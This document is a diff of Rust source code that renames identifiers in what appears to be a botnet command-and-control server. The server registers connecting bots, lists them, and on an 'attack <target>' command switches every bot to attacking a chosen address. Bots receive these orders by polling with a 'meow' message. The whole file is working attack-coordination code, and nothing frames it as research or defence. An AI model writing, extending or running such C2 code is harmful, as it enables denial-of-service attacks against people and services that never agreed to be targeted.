@@ -9,12 +9,12 @@ use tokio::{
 };
 
 #[derive(Debug)]
-struct Femboy {
+struct Bot {
     state: BotState,
     timestamp: SystemTime
 }
 
-type BotTable = Arc<Mutex<HashMap<SocketAddr, Femboy>>>;
+type BotTable = Arc<Mutex<HashMap<SocketAddr, Bot>>>;
 
 #[tokio::main]
 async fn main() {
@@ -27,9 +27,9 @@ async fn main() {
         process::exit(1);
     });
 
-    let femtable: BotTable = Arc::new(Mutex::new(HashMap::new()));
+    let bot_table: BotTable = Arc::new(Mutex::new(HashMap::new()));
 
-    let listen_femtable = Arc::clone(&femtable);
+    let listen_bot_table = Arc::clone(&bot_table);
 
     tokio::spawn(async move {
         let listener = TcpListener::bind(format!("0.0.0.0:{port}"))
@@ -51,24 +51,24 @@ async fn main() {
             };
 
             {
-                let mut femtable = listen_femtable.lock().unwrap_or_else(|_| {
+                let mut bot_table = listen_bot_table.lock().unwrap_or_else(|_| {
                     process::exit(1);
                 });
 
-                femtable.insert(
+                bot_table.insert(
                     femboy.1,
-                    Femboy { state: BotState::Idle, timestamp: SystemTime::now() }
+                    Bot { state: BotState::Idle, timestamp: SystemTime::now() }
                 );
 
             }
 
             println!("[\x1b[94mINFO\x1b[0m] New Bot {}", femboy.1);
-            let bot_table = Arc::clone(&listen_femtable);
+            let bot_table = Arc::clone(&listen_bot_table);
             tokio::spawn(async move { handle_femboy(bot_table, femboy.1, femboy.0).await });
         }
     });
 
-    let command_femtable = Arc::clone(&femtable);
+    let command_bot_table = Arc::clone(&bot_table);
 
     tokio::spawn(async move {
         sleep(Duration::from_secs(1)).await; // Give everything sometime to start
@@ -88,16 +88,16 @@ async fn main() {
             });
 
             if command == "bots" {
-                let femtable = femtable.lock().unwrap_or_else(|_| {
+                let bot_table = bot_table.lock().unwrap_or_else(|_| {
                     process::exit(1);
                 });
 
-                display_table(&*femtable);
+                display_table(&*bot_table);
             }
             else if command == "attack" {
                 let target = command_string.next();
                 if let Some(target) = target {
-                    let mut table = command_femtable.lock().unwrap();
+                    let mut table = command_bot_table.lock().unwrap();
                     for (_,v) in table.iter_mut() {
                         v.state = BotState::Attacking(target.to_owned());
                     }
@@ -109,7 +109,7 @@ async fn main() {
                 }
             }
             else if command == "stop" {
-                let mut table = command_femtable.lock().unwrap();
+                let mut table = command_bot_table.lock().unwrap();
                 for (_,v) in table.iter_mut() {
                     v.state = BotState::Idle;
                 }
@@ -127,14 +127,14 @@ async fn main() {
     .await.ok();
 }
 
-async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStream) {
+async fn handle_femboy(bot_table: BotTable, addr: SocketAddr, mut stream: TcpStream) {
 
     let config = bincode::config::standard();
     loop {
         let size = match stream.read_u16().await {
             Ok(size) => size,
             Err(_) => {
-                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                let mut table = bot_table.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                 table.remove(&addr);
                 println!("[\x1b[94mINFO\x1b[0m] Bot dissconnected ({addr})");
                 return
@@ -143,7 +143,7 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
 
         let mut buf = vec![0u8; size as usize];
         if let Err(_) = stream.read_exact(buf.as_mut_slice()).await {
-            let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+            let mut table = bot_table.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
             table.remove(&addr);
             println!("[\x1b[94mINFO\x1b[0m] Bot dissconnected ({addr})");
             return
@@ -152,7 +152,7 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
         let msg = match String::from_utf8(buf) {
             Ok(msg) => msg,
             Err(_) => {
-                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                let mut table = bot_table.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                 table.remove(&addr);
                 println!("[\x1b[94mINFO\x1b[0m] Bot sent invalid message, disconnecting ({addr})");
                 return
@@ -161,7 +161,7 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
 
         if msg == "meow" {
             let state = {
-                let mut table = femtable.lock().unwrap_or_else(|_| {
+                let mut table = bot_table.lock().unwrap_or_else(|_| {
                     panic!("uh oh");
                 });
 
@@ -172,7 +172,7 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
             let payload = match bincode::encode_to_vec(state, config) {
                 Ok(payload) => payload,
                 Err(_) => {
-                    let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                    let mut table = bot_table.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                     table.remove(&addr);
                     println!("[\x1b[94mINFO\x1b[0m] Server error, failed to encode state, disconnecting bot ({addr})");
                     return
@@ -180,14 +180,14 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
             };
 
             if let Err(_) = stream.write_u16(payload.len() as u16).await {
-                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                let mut table = bot_table.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                 table.remove(&addr);
                 println!("[\x1b[94mINFO\x1b[0m] Bot disconnected ({addr})");
                 return
             }
 
             if let Err(_) = stream.write_all(payload.as_slice()).await {
-                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                let mut table = bot_table.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                 table.remove(&addr);
                 println!("[\x1b[94mINFO\x1b[0m] Bot disconnected ({addr})");
                 return
@@ -195,7 +195,7 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
             }
         }
         else {
-            let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+            let mut table = bot_table.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
             table.remove(&addr);
             println!("[\x1b[94mINFO\x1b[0m] Bot sent wrong message, disconnecting ({addr})");
             return
@@ -204,8 +204,8 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
     }
 }
 
-fn display_table(femtable: &HashMap<SocketAddr, Femboy>) {
-    for (k,v) in femtable.iter() {
+fn display_table(bot_table: &HashMap<SocketAddr, Bot>) {
+    for (k,v) in bot_table.iter() {
         match v.state {
             BotState::Idle => println!("\x1b[92m●\x1b[0m {k} Idle"),
             BotState::Attacking(ref addr) => println!("\x1b[91m●\x1b[0m {k} Attacking -> {addr}"),
